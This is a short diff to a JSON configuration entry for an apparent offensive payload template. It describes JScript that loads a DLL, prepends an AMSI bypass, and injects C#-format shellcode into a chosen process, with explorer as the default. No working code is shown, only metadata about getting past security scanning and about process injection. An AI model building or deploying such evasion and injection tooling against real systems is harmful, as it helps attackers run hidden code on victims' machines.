@@ -1,8 +1,14 @@
 {
     "category" : ["jscript","dll","amsi"],
-    "description" : "JScript that runs a dll shell code runner. Prepends an amsi bypass",
+    "description" : "JScript that runs a dll that does process injection0. Prepends an amsi bypass",
     "contentFile" : "jscriptfromdllamsibypass.txt",
-    
+    "customAttributes": [
+        {
+            "name": "injectedProcess",
+            "description": "Process to inject into",
+            "defaultValue": "explorer"
+        }
+    ],
     "shellCode" : {
         "hasShellCode":true,
         "format" : "csharp"
